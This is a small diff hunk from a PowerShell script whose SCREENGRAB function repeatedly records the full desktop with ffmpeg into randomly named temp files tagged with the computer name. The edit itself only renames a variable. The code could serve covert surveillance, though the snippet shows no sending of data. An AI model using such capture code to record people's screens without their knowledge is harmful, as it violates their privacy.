@@ -23,7 +23,7 @@ function SCREENGRAB($alt,$rectime,$startat,$endat) {
 		"Checking for running ffmpeg"
 		while ($startat -lt $endat) {
 			$rand=get-random -Minimum 1000 -Maximum 9999
-			$vid="$TempDir\$env:computername-$rand-$filenameDate.mkv" #video filename
+			$vid="$TempDir\$pcname-$rand-$filenameDate.mkv" #video filename
 			$param1="-filter_complex ddagrab=0,hwdownload,format=bgra -c:v libx264 -crf 40 -preset medium -tune stillimage -t $rectime $vid"
 			$param2="-f gdigrab -framerate 25 -i desktop -t $rectime -c:v libx264 -preset medium -crf 40 -tune stillimage $vid"
 			switch ($alt) {
